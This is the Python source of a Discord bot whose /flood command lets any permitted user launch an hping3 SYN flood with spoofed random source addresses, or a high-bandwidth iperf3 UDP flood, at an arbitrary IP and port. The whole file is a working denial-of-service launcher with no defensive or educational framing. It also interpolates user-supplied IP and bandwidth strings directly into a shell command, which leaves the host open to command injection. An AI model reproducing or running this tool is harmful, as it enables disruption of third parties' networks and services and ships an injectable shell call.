# bot.py
import os
import asyncio
from typing import Literal
import subprocess

import discord
from discord import app_commands
from discord.ext import commands

# ─── Configuration ──────────────────────────────────────────────────────────────
BOT_TOKEN       = os.getenv("DISCORD_TOKEN")
ALLOWED_ROLE_ID = int(os.getenv("FLOODER_ROLE_ID", "0"))  # 0 = open to all

# Defaults for quick floods
DEFAULT_TCP_DUR = 5      # seconds
DEFAULT_UDP_BW  = "1G"
DEFAULT_UDP_DUR = 5      # seconds
# ────────────────────────────────────────────────────────────────────────────────

class FloodBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=discord.Intents.none())
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        self.tree.add_command(flood)
        await self.tree.sync()

bot = FloodBot()

def has_flood_role(interaction: discord.Interaction) -> bool:
    if ALLOWED_ROLE_ID == 0:
        return True
    return any(r.id == ALLOWED_ROLE_ID for r in interaction.user.roles)

async def run_subprocess(cmd: str, timeout: float) -> tuple[int, str]:
    proc = await asyncio.create_subprocess_shell(
        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    await asyncio.sleep(timeout)
    proc.terminate()
    try:
        await proc.wait()
    except:
        proc.kill()
    _, err = await proc.communicate()
    return proc.returncode, err.decode().strip()

@bot.tree.command(name="flood", description="Quick TCP/UDP flood via hping3 or iperf3")
@app_commands.describe(
    tool="Which tool to use: hping3 or iperf3",
    ip="Target IPv4",
    port="Target port",
    bw="(iperf3) bandwidth, e.g. 100M,1G",
    dur="Duration in seconds",
)
async def flood(
    interaction: discord.Interaction,
    tool: Literal["hping3", "iperf3"],
    ip: str,
    port: int,
    bw: str | None = None,
    dur: int | None = None,
):
    if not has_flood_role(interaction):
        return await interaction.response.send_message("🚫 No permission.", ephemeral=True)

    await interaction.response.defer(thinking=True)

    if tool == "hping3":
        d = dur or DEFAULT_TCP_DUR
        cmd = f"hping3 --flood --rand-source -S -p {port} {ip}"
        desc = f"SYN flood at `{ip}:{port}` for ~{d}s"
    else:
        b  = bw  or DEFAULT_UDP_BW
        d  = dur or DEFAULT_UDP_DUR
        cmd = f"iperf3 -c {ip} -u -b {b} -t {d} -p {port} -y C"
        desc = f"UDP flood at `{ip}:{port}` @ {b} for {d}s"

    code, stderr = await run_subprocess(cmd, timeout=(dur or DEFAULT_TCP_DUR) + 1)
    if code == 0:
        await interaction.followup.send(f"✅ `{tool}` completed: {desc}")
    else:
        await interaction.followup.send(f"⚠️ `{tool}` exited {code}\n```{stderr}```")

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
